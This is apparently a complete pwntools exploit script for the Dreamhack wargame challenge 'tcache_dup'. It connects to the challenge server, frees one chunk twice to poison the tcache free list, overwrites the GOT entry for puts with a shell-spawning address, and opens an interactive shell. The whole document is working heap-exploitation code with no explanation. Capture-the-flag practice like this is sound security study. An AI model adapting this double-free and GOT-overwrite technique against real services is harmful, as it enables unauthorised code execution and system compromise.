from pwn import *

r = remote("host3.dreamhack.games", 10469)
e = ELF("./tcache_dup")
libc = ELF("./libc-2.27.so")

def Create(size, data):
    r.sendlineafter("> ", str(1))
    r.sendlineafter("Size: ", str(size))
    r.sendafter("Data: ", data)

def Delete(idx):
    r.sendlineafter("> ", str(2))
    r.sendlineafter("idx: ", str(idx))

get_shell = 0x400ab0
puts_got = e.got["puts"]

Create(16, b"datadatad")
Delete(0)
Delete(0)
Create(16, p64(puts_got))
Create(16, "data")
Create(16, p64(get_shell))



r.interactive()